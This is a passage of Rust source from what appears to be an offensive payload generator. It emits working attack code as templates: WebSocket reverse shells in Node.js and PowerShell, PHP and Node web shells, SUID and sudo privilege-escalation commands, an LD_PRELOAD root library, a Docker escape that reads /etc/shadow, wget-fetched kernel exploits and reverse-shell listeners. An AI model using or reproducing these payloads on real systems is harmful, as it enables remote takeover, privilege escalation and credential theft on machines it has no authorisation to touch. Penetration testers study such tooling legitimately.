    const payload = Buffer.from(data);
    const length = payload.length;
    let frame;

    if (length < 126) {{
        frame = Buffer.alloc(2 + length);
        frame[0] = 0x81; // FIN + text frame
        frame[1] = length;
        payload.copy(frame, 2);
    }} else if (length < 65536) {{
        frame = Buffer.alloc(4 + length);
        frame[0] = 0x81;
        frame[1] = 126;
        frame.writeUInt16BE(length, 2);
        payload.copy(frame, 4);
    }} else {{
        frame = Buffer.alloc(10 + length);
        frame[0] = 0x81;
        frame[1] = 127;
        frame.writeBigUInt64BE(BigInt(length), 2);
        payload.copy(frame, 10);
    }}

    return frame;
}}

console.log('[*] WebSocket Reverse Shell');
console.log(`[*] Target: ws://${{LHOST}}:${{LPORT}}`);

const client = net.connect(LPORT, LHOST, () => {{
    // WebSocket handshake
    client.write(createHandshake());
}});

let handshakeDone = false;

client.on('data', (data) => {{
    if (!handshakeDone) {{
        if (data.toString().includes('101')) {{
            handshakeDone = true;
            console.log('[+] WebSocket connected');
            client.write(createFrame('[*] Node.js WebSocket shell'));
        }}
        return;
    }}

    const cmd = parseFrame(data);
    if (!cmd) return;

    if (cmd === 'exit' || cmd === 'quit') {{
        client.write(createFrame('[*] Exiting'));
        client.end();
        process.exit(0);
    }}

    // Execute command
    const proc = spawn('sh', ['-c', cmd]);
    let output = '';

    proc.stdout.on('data', (chunk) => {{ output += chunk; }});
    proc.stderr.on('data', (chunk) => {{ output += chunk; }});

    proc.on('close', () => {{
        if (output) {{
            client.write(createFrame(output));
        }} else {{
            client.write(createFrame('[*] Command executed (no output)'));
        }}
    }});
}});

client.on('error', (err) => {{
    console.log(`[!] Error: ${{err.message}}`);
}});
"#,
            lhost = config.lhost,
            lport = config.lport
        )
    }

    /// PowerShell WebSocket reverse shell
    fn powershell_websocket_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# WebSocket Reverse Shell - PowerShell
# Uses .NET WebSocket class (simple and clean)

$LHOST = "{lhost}"
$LPORT = {lport}

Write-Host "[*] WebSocket Reverse Shell"
Write-Host "[*] Target: ws://$LHOST`:$LPORT"

try {{
    # Create WebSocket client
    $ws = New-Object System.Net.WebSockets.ClientWebSocket

    # Connect
    $uri = New-Object System.Uri("ws://$LHOST`:$LPORT")
    $cts = New-Object System.Threading.CancellationTokenSource
    $task = $ws.ConnectAsync($uri, $cts.Token)
    $task.Wait()

    Write-Host "[+] WebSocket connected"

    # Send banner
    $banner = [System.Text.Encoding]::UTF8.GetBytes("[*] PowerShell WebSocket shell")
    $segment = New-Object System.ArraySegment[byte](,$banner)
    $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
    $task.Wait()

    # Main loop
    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {{
        # Receive command
        $buffer = New-Object byte[] 4096
        $segment = New-Object System.ArraySegment[byte](,$buffer)
        $task = $ws.ReceiveAsync($segment, $cts.Token)
        $task.Wait()

        if ($task.Result.Count -eq 0) {{ break }}

        $cmd = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $task.Result.Count)

        if ($cmd -match "exit|quit") {{
            $msg = [System.Text.Encoding]::UTF8.GetBytes("[*] Exiting")
            $segment = New-Object System.ArraySegment[byte](,$msg)
            $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
            $task.Wait()
            break
        }}

        # Execute command
        try {{
            $output = Invoke-Expression $cmd 2>&1 | Out-String
        }} catch {{
            $output = "[!] Error: $($_.Exception.Message)"
        }}

        # Send output
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
        $segment = New-Object System.ArraySegment[byte](,$bytes)
        $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
        $task.Wait()
    }}

}} catch {{
    Write-Host "[!] Error: $($_.Exception.Message)"
}} finally {{
    if ($ws) {{ $ws.Dispose() }}
}}
"#,
            lhost = config.lhost,
            lport = config.lport
        )
    }

    /// Generate web shell
    pub fn generate_web_shell(shell_type: ShellType) -> String {
        match shell_type {
            ShellType::PHP => Self::php_web_shell(),
            ShellType::Node => Self::node_web_shell(),
            _ => "Unsupported web shell type".to_string(),
        }
    }

    /// PHP web shell
    fn php_web_shell() -> String {
        r#"<?php
// Simple PHP web shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

<!-- Usage: http://target.com/shell.php?cmd=whoami -->

<?php
// Advanced PHP web shell with file operations
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<?php
// Mini shell
<?=`$_GET[0]`?>
// Usage: http://target.com/shell.php?0=whoami

<?php
// One-liner
<?php eval($_POST['cmd']); ?>
// Usage: curl -X POST -d "cmd=system('whoami');" http://target.com/shell.php
"#
        .to_string()
    }

    /// Node.js web shell
    fn node_web_shell() -> String {
        r#"// Node.js web shell
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/shell', (req, res) => {
    const cmd = req.query.cmd;
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            res.send(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            res.send(`Stderr: ${stderr}`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(3000, () => {
    console.log('Web shell listening on port 3000');
});

// Usage: http://target.com:3000/shell?cmd=whoami
"#
        .to_string()
    }

    /// Generate privilege escalation payload
    pub fn generate_privesc_payload(technique: &str) -> String {
        match technique {
            "suid_abuse" => Self::suid_abuse_payload(),
            "sudo_abuse" => Self::sudo_abuse_payload(),
            "docker_escape" => Self::docker_escape_payload(),
            "kernel_exploit" => Self::kernel_exploit_payload(),
            _ => "Unknown privilege escalation technique".to_string(),
        }
    }

    /// SUID binary abuse payload
    fn suid_abuse_payload() -> String {
        r#"# SUID Binary Abuse Techniques

# Find SUID binaries:
find / -perm -4000 -type f 2>/dev/null

# Common GTFOBins SUID exploits:

# 1. vim/vi with SUID
vim -c ':!/bin/sh'
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# 2. find with SUID
find . -exec /bin/sh -p \; -quit

# 3. bash with SUID
bash -p

# 4. cp with SUID (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd

# 5. nmap with SUID (old versions)
nmap --interactive
!sh

# 6. python with SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 7. perl with SUID
perl -e 'exec "/bin/sh";'

# 8. php with SUID
php -r "pcntl_exec('/bin/sh', ['-p']);"

# Check GTFOBins for more: https://gtfobins.github.io/
"#
        .to_string()
    }

    /// Sudo abuse payload
    fn sudo_abuse_payload() -> String {
        r#"# Sudo Abuse Techniques

# 1. Check sudo permissions
sudo -l

# 2. If (ALL:ALL) ALL
sudo /bin/bash
sudo su -

# 3. Sudo vim
sudo vim -c ':!/bin/sh'

# 4. Sudo find
sudo find . -exec /bin/sh \; -quit

# 5. Sudo nmap (interactive mode)
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# 6. Sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 7. Sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# 8. LD_PRELOAD hijacking (if env_keep+=LD_PRELOAD)
# Create evil shared library:
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_command>
"#
        .to_string()
    }

    /// Docker escape payload
    fn docker_escape_payload() -> String {
        r#"# Docker Container Escape

# 1. Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# 2. Privileged container escape
docker run --rm -it --privileged ubuntu bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 3. Docker socket exposed
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh

# 4. Check for docker group
groups
docker ps
"#
        .to_string()
    }

    /// Kernel exploit payload
    fn kernel_exploit_payload() -> String {
        r#"# Kernel Exploitation

# 1. Identify kernel version
uname -a
cat /proc/version

# 2. Search for exploits
searchsploit linux kernel <version>
searchsploit -m <exploit_id>

# 3. Common kernel exploits:

# DirtyCOW (CVE-2016-5195)
# https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
# gcc -pthread dirty.c -o dirty -lcrypt
# ./dirty password

# OverlayFS (CVE-2015-1328) - Ubuntu 14.04/15.10
# wget https://www.exploit-db.com/raw/37292
# gcc 37292.c -o exploit
# ./exploit

# Double-Free (CVE-2017-6074) - DCCP
# https://www.exploit-db.com/exploits/41458
# gcc 41458.c -o exploit
# ./exploit

# 4. Compile and run
gcc exploit.c -o exploit
./exploit
"#
        .to_string()
    }

    /// Generate listener command
    pub fn generate_listener_command(port: u16) -> String {
        format!(
            r#"# Reverse Shell Listeners

# 1. Netcat (traditional)
nc -lvnp {}

# 2. Netcat (OpenBSD)
nc -lvp {}

# 3. Ncat (nmap version)
ncat -lvnp {}

# 4. Ncat with SSL
ncat --ssl -lvnp {}

# 5. Socat
socat TCP-LISTEN:{},reuseaddr,fork -

# 6. Socat with SSL
socat OPENSSL-LISTEN:{},cert=server.pem,verify=0,fork -

# 7. Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST <your_ip>; set LPORT {}; exploit"

# 8. PowerShell listener (Windows)
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()
"#,
            port, port, port, port, port, port, port, port,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let config = PayloadConfig {
            lhost: "10.10.10.10".to_string(),
            lport: 4444,
        };

        let bash_shell = PayloadGenerator::generate_reverse_shell(ShellType::Bash, &config);
        assert!(bash_shell.contains("10.10.10.10"));
        assert!(bash_shell.contains("4444"));

        let python_shell = PayloadGenerator::generate_reverse_shell(ShellType::Python, &config);
        assert!(python_shell.contains("socket"));
    }

    #[test]
    fn test_listener_command() {
        let listener = PayloadGenerator::generate_listener_command(4444);
        assert!(listener.contains("4444"));
        assert!(listener.contains("nc"));
    }
}
